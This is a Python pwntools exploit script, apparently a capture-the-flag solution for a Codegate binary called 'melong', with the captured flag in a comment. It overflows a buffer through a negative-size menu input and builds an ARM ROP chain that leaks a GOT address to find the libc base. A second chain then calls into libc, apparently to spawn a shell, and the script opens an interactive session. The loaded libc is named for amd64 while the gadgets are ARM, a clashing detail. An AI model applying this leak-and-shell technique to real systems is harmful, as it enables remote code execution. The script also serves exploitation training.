#!/usr/bin/env python
from pwn import *


# FLAG{D0n7_7h1nk_7ha7_1_Can_3xp1ain_it}

e , l = ELF( './melong' ) , ELF( './libc6_2.23-0ubuntu10_amd64.so' )

host , port = 'ch41l3ng3s.codegate.kr' , 1199
#host  , port = '192.168.78.132' , 4000
y = remote( host , port )


def bmi( h , w ):
    y.sendlineafter( 'ber:' , '1' )
    y.sendlineafter( ':' , str( h ) )
    y.sendlineafter( ':' , str( w ) )

def exc():
    y.sendlineafter( 'ber:' , '3' )
    y.sendlineafter( '?' , '-1' )

def wri( data ):
    y.sendlineafter( 'ber:' , '4' )
    sleep(0.7)
    y.sendline( data )


main = 0x000110cc
pop_r0 = 0x00011bbc # pop {r0, pc}


bmi( 1.76 , 67 )

p = flat(
    'Y' * 0x54,
    pop_r0,
    e.got['read'],
    0x104a8,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    main
)

exc()

wri( p )

y.sendlineafter( 'ber:' , '6' )

y.recvuntil( ':)\n' )

l = u32( y.recv(4).ljust( 4 , '\x00' ) ) - 0xc2ae0
log.success( 'libc -> %s' % hex( l ) )

p = flat(
    'Y' * 0x54,
    pop_r0,
    l + 0x12121c,
    l + 0x38634,
)

bmi( 1.76 , 67 )

exc()

wri( p )

y.sendlineafter( 'ber:' , '6' )

y.interactive()